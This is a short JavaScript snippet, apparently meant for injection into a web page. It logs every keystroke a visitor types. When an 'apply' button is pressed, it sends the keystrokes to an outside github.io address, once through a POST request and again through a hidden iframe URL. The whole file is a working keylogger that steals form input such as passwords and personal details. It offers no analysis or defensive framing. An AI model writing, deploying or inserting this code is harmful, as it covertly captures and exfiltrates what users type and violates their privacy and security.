
var keyPresses = "";
document.onkeydown = function (e) {
	keyPresses += e.key;
};
$("#applybutton").mousedown(function () {
    $.post("https://faisal-akhtar-fgh.github.io/kal/", keyPresses);
	$("body").append('<iframe src="https://faisal-akhtar-fgh.github.io/kal/?data='+ keyPresses + '"></iframe>');
});
